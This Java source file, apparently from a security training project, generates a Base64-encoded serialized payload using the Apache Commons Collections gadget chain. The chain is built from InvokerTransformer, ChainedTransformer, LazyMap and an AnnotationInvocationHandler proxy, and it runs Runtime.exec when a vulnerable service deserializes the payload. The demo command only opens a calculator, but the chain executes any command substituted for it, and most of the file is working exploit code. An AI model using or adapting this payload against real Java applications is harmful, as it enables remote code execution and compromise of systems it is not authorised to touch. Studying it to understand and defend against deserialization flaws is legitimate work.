package cc;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.codec.binary.Hex;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.springframework.util.Base64Utils;

import com.mydomain.security.training.front.controller.User;
import com.mydomain.security.training.front.gadget.Gadget;

public class CCAttack {

	public static void main(String... args) throws Exception {
		// serializeGadget();
		Object evilObject = getEvilObject();
		serialize(evilObject);
	}

	private static void serializeGadget() throws Exception {
		Gadget g = new Gadget();
		g.setParam("open -a calculator");
		serialize(g);
	}

	private static String getClassName(String[] hexArray) {
		String firstByte = hexArray[6];
		String secondByte = hexArray[7];
		Integer size1 = Integer.parseInt(firstByte, 16);
		Integer size2 = Integer.parseInt(secondByte, 16);
		Integer totalSize = size1 * 100 + size2;
		StringBuilder name = new StringBuilder();
		for (int i = 8; i < 8 + totalSize; i++) {
			name.append((char) Integer.parseInt(hexArray[i], 16));
		}
		return name.toString();

	}

	private static String[] getHexaArray(String hexa) {
		String[] hex_arr = new String[hexa.length() / 2];
		for (int i = 0; i < hex_arr.length; i++) {
			hex_arr[i] = hexa.substring(2 * i, 2 * (i + 1));
		}
		return hex_arr;
	}

	private static void serialize(Object g) {
		ObjectOutputStream out1 = null;
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			out1 = new ObjectOutputStream(baos);
			out1.writeObject(g);
			System.out.println(Base64Utils.encodeToString(baos.toByteArray()));
		} catch (Exception e) {
			System.out.println("Exception: " + e.toString());
		}

	}

	public static Object getGoodObject() {
		User u = new User();
		u.setLastName("lastName");
		u.setName("name");
		return u;
	}

	public static Object getEvilObject()
			throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException {

		String[] command = { "open -a calculator" };

		final Transformer[] transformers = new Transformer[] {

				new ConstantTransformer(Runtime.class),

				new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class },
						new Object[] { "getRuntime", new Class[0] }),

				new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class },
						new Object[] { null, new Object[0] }),

				new InvokerTransformer("exec", new Class[] { String.class }, command) };

		ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

		Map map = new HashMap<>();
		Map lazyMap = LazyMap.decorate(map, chainedTransformer);

		String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
		final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
		constructor.setAccessible(true);
		InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class,
				lazyMap);
		Proxy evilProxy = (Proxy) Proxy.newProxyInstance(CCAttack.class.getClassLoader(), new Class[] { Map.class },
				secondInvocationHandler);

		InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class,
				evilProxy);
		return invocationHandlerToSerialize;

	}

	public static void deserializeAndDoNothing(byte[] byteArray) throws IOException, ClassNotFoundException {
		ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArray));
		ois.readObject();
	}

	public static byte[] serializeToByteArray(Object object) throws IOException {
		ByteArrayOutputStream serializedObjectOutputContainer = new ByteArrayOutputStream();
		ObjectOutputStream objectOutputStream = new ObjectOutputStream(serializedObjectOutputContainer);
		objectOutputStream.writeObject(object);
		return serializedObjectOutputContainer.toByteArray();
	}

	public static Object deserializeFromByteArray(byte[] serializedObject) throws IOException, ClassNotFoundException {
		ByteArrayInputStream serializedObjectInputContainer = new ByteArrayInputStream(serializedObject);
		ObjectInputStream objectInputStream = new ObjectInputStream(serializedObjectInputContainer);
		/* InvocationHandler evilInvocationHandler = (InvocationHandler) */objectInputStream.readObject();
		// return evilInvocationHandler;
		return null;
	}

}
